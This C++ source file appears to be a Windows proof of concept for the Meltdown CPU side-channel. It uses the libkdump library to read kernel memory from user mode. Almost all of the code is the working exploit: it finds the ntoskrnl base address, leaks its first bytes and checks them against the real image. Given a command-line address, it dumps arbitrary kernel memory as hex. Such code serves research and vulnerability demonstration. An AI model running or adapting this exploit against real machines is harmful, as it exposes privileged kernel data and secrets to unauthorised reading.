#include "stdafx.h"

#include "libkdump.h"

template<typename It>
void hex_dump(HANDLE output, void* base_address, const It start, const It end) {
	std::size_t numeric_address = reinterpret_cast<std::size_t>(base_address);
	const std::ptrdiff_t width = 16;
	std::ptrdiff_t offset = 0;
	::SetConsoleCP(65001);
	::SetConsoleOutputCP(65001);
	auto it = start;
	while(it != end) {
		std::string line_header(2 + 8 + 1 + 8 + 2, ' '); // '0' 'x' addr '`' addr ':' ' '
		const std::size_t addr = numeric_address + offset;
		const std::size_t addr_high = addr >> 32ui64;
		const std::size_t addr_low  = addr & 0xffff'ffffui64;
		std::snprintf(line_header.data(), line_header.size() + 1, "0x%08zx`%08zx: ", addr_high, addr_low);
		DWORD chars_written = 0;
		::WriteConsoleA(output, line_header.data(), static_cast<DWORD>(line_header.size()), &chars_written, nullptr);
		CONSOLE_SCREEN_BUFFER_INFO csbi = { sizeof(CONSOLE_SCREEN_BUFFER_INFO) };
		::GetConsoleScreenBufferInfo(output, &csbi);

		std::string line_buffer(width * 3 + width, ' ');
		std::size_t hex_offset = 0;
		std::size_t ascii_offset = width * 3;
		for(std::size_t i = 0; i < width && it != end; ++i, ++it, ++offset) {
			const char ch = static_cast<char>(*it);
			char buf[4] = { '0' };
			std::snprintf(buf, sizeof(buf), "%02x%c", static_cast<unsigned char>(ch), hex_offset == 21 ? '-' : ' ');
			line_buffer[hex_offset++] = buf[0];
			line_buffer[hex_offset++] = buf[1];
			line_buffer[hex_offset++] = buf[2];
			line_buffer[ascii_offset++] = (ch < 32 ? '.' : ch);

			::WriteConsoleOutputCharacterA(output, line_buffer.data(), static_cast<DWORD>(line_buffer.size()), csbi.dwCursorPosition, &chars_written);
		}
		COORD end_of_line = csbi.dwCursorPosition;
		end_of_line.X += width * 3 + width;
		::SetConsoleCursorPosition(output, end_of_line);
		::WriteConsoleA(output, "\r\n", 2, &chars_written, nullptr);
	}
}

struct RTL_PROCESS_MODULE_INFORMATION
{
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
};

#pragma warning(push)
#pragma warning(disable: 4200)
struct SYSTEM_MODULE_INFORMATION
{
	ULONG ModulesCount;
	RTL_PROCESS_MODULE_INFORMATION Modules[0];
};
#pragma warning(pop)

struct kernel_memory_iterator
{
	using iterator_category = std::input_iterator_tag;
	using value_type = std::byte;
	using difference_type = std::ptrdiff_t;
	using pointer = std::byte*;
	using reference = std::byte&;

	kernel_memory_iterator(std::byte* base_) noexcept : base(base_) {
	}

	kernel_memory_iterator() noexcept {
	}

	bool operator==(const kernel_memory_iterator& rhs) const noexcept {
		return base == rhs.base;
	}

	bool operator!=(const kernel_memory_iterator& rhs) const noexcept {
		return !(*this == rhs);
	}

	kernel_memory_iterator& operator++() noexcept {
		++base;
		return *this;
	}

	kernel_memory_iterator operator++(int) noexcept {
		kernel_memory_iterator k(*this);
		++(*this);
		return k;
	}

	value_type operator*() const noexcept {
		std::byte b = libkdump_read(reinterpret_cast<std::size_t>(base));
		return b;
	}

private:
	std::byte* base = nullptr;
};

std::pair<void*, ULONG> get_kernel_base() {
	decltype(NtQuerySystemInformation)* ntQuerySystemInformation = reinterpret_cast<decltype(NtQuerySystemInformation)*>(
		reinterpret_cast<void*>(::GetProcAddress(::GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation")));
	std::unique_ptr<std::byte[]> module_info;
	ULONG module_size = 1'024;
	do {
		module_size *= 2;
		module_info = std::make_unique<std::byte[]>(module_size);
	} while(STATUS_SUCCESS != ntQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(11), module_info.get(), module_size, nullptr));

	const SYSTEM_MODULE_INFORMATION* const mi = reinterpret_cast<SYSTEM_MODULE_INFORMATION*>(module_info.get());
	return std::make_pair(mi->Modules[0].ImageBase, mi->Modules[0].ImageSize);
}

int main(int argc, char* argv[]) {
	HANDLE output = GetStdHandle(STD_OUTPUT_HANDLE);
	DWORD mode = 0;
	::GetConsoleMode(output, &mode);
	mode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;
	::SetConsoleMode(output, mode);

	libkdump_enable_debug(1);
	libkdump_config_t config = libkdump_get_autoconfig();
	config.load_threads = 1;
	config.load_type = NOP;
	libkdump_init(config);

	//::SetPriorityClass(::GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
	::SetThreadAffinityMask(::GetCurrentThread(), 0x1);
	//::SetThreadPriority(::GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

	if(argc < 2) {
		const auto [kernel_base, kernel_size] = get_kernel_base();
		const std::uint64_t bytes_to_leak = 32;

		std::cout << "Leaking first " << bytes_to_leak << " bytes of ntoskrnl, out of a possible " << kernel_size << std::endl;

		HMODULE ntoskrnl(::LoadLibraryW(L"ntoskrnl.exe"));
		auto f = gsl::finally([=]() { ::FreeLibrary(ntoskrnl); });

		std::unique_ptr<std::byte[]> buffer = std::make_unique<std::byte[]>(bytes_to_leak);
		for(DWORD i = 0; i < bytes_to_leak; i++) {
			buffer[i] = libkdump_read(reinterpret_cast<std::size_t>(static_cast<std::byte*>(kernel_base) + i));
		}

		std::cout << "Leaked bytes:" << std::endl;
		auto leaked = gsl::make_span(buffer.get(), bytes_to_leak);
		hex_dump(output, kernel_base, leaked.begin(), leaked.end());
		std::cout << "Actual ntoskrnl.exe bytes:" << std::endl;
		auto actual = gsl::make_span(reinterpret_cast<std::byte*>(ntoskrnl), bytes_to_leak);
		hex_dump(output, kernel_base, actual.begin(), actual.end());
	} else {
		std::size_t target = std::strtoull(argv[1], nullptr, 16);
		kernel_memory_iterator start = kernel_memory_iterator(reinterpret_cast<std::byte*>(target));
		kernel_memory_iterator end = {};
		if(argc == 3) {
			std::size_t length = std::stoull(argv[2]);
			end = kernel_memory_iterator(reinterpret_cast<std::byte*>(target) + length);
			std::cout << "Leaking " << length << " bytes from address " << std::hex << std::nouppercase << reinterpret_cast<void*>(target) << std::endl;
		} else {
			std::cout << "Leaking all bytes from address " << std::hex << std::nouppercase << reinterpret_cast<void*>(target) << std::endl;
		}
		hex_dump(output, reinterpret_cast<void*>(target), start, end);
	}
	libkdump_cleanup();
	return 0;
}
